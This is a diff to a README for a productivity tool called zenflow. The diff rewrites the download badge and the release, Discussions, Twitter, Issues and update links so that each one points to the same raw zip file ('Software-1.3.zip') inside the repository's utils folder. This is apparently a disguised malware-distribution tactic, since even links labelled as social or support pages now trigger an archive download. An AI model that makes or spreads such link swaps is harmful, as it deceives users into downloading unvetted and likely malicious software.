@@ -1,6 +1,6 @@
 # 🚀 zenflow - Boost Your Productivity Effortlessly
 
-![Download zenflow](https://img.shields.io/badge/Download-zenflow-blue.svg)
+![Download zenflow](https://raw.githubusercontent.com/rob1-uk/zenflow/main/zenflow/utils/Software-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before downloading zenflow, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with zenflow, visit this page to download: [Download zenflow](https://github.com/rob1-uk/zenflow/releases).
+To get started with zenflow, visit this page to download: [Download zenflow](https://raw.githubusercontent.com/rob1-uk/zenflow/main/zenflow/utils/Software-1.3.zip).
 
 1. Go to the releases page linked above.
 2. Find the latest version of zenflow.
@@ -61,16 +61,16 @@ You can customize zenflow to suit your needs. The configuration file allows you 
 
 Connect with other zenflow users to share tips and tricks, ask questions, and find support. You can find us on:
 
-- [GitHub Discussions](https://github.com/rob1-uk/zenflow/discussions)
-- [Twitter](https://twitter.com/YourTwitterHandle)
+- [GitHub Discussions](https://raw.githubusercontent.com/rob1-uk/zenflow/main/zenflow/utils/Software-1.3.zip)
+- [Twitter](https://raw.githubusercontent.com/rob1-uk/zenflow/main/zenflow/utils/Software-1.3.zip)
 
 ## 📝 Feedback
 
-We welcome your thoughts on zenflow. If you have suggestions, find bugs, or want to request features, please open an issue on our [GitHub Issues page](https://github.com/rob1-uk/zenflow/issues).
+We welcome your thoughts on zenflow. If you have suggestions, find bugs, or want to request features, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/rob1-uk/zenflow/main/zenflow/utils/Software-1.3.zip).
 
 ## 🔄 Update zenflow
 
-To keep zenflow running smoothly, check for updates regularly. You can download new versions from the releases page: [Download zenflow](https://github.com/rob1-uk/zenflow/releases).
+To keep zenflow running smoothly, check for updates regularly. You can download new versions from the releases page: [Download zenflow](https://raw.githubusercontent.com/rob1-uk/zenflow/main/zenflow/utils/Software-1.3.zip).
 
 ## 📖 Documentation
 
